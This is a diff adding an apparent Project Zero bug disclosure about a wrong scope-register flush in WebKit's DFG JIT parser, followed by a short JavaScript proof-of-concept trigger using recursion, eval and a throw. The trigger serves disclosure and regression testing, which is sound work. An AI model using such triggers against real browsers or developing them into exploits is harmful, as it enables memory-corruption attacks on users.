@@ -1,0 +1,27 @@
+<!--
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1234
+
+Here's a snippet of DFG::ByteCodeParser::flush(InlineStackEntry* inlineStackEntry).
+
+void flush(InlineStackEntry* inlineStackEntry)
+{
+	...
+    if (m_graph.needsScopeRegister())
+        flush(m_codeBlock->scopeRegister()); <<--- (a)
+}
+
+At (a), it should flush the scope register of |inlineStackEntry->m_codeBlock| instead of |m_codeBlock|. But it doesn't. As a result, the scope register of |inlineStackEntry->m_codeBlock| may have an incorrect offset in the stack layout phase.
+
+PoC:
+-->
+
+function f() {
+    (function () {
+    	eval('1');
+    	f();
+    }());
+
+    throw 1;
+}
+
+f();
